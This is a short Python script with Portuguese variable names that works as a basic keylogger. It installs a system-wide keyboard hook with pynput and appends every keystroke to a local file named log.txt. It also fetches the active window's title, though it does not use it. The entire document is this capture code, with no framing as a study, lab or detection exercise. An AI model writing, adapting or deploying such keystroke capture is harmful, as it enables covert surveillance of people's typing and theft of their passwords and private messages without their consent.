from pynput.keyboard import Key, Listener
import win32gui

numeros = [str(i) for i in range(10)]
letras_min = [chr(i) for i in range(ord('a'), ord('z')+1)]
letras_mai = [chr(i) for i in range(ord('A'), ord('Z')+1)]

alf_comp = numeros + letras_min + letras_mai
def on_press(key):
    hwnd = win32gui.GetForegroundWindow()
    win_title = win32gui.GetWindowText(hwnd)
    key = str(key)
    with open("log.txt", "a") as f:
        print(key)
        key = key.replace("'", "")
        if(key in alf_comp):
            f.write(key)
        else:
            f.write(key + "\n")

with Listener(on_press=on_press) as listener:
    listener.join()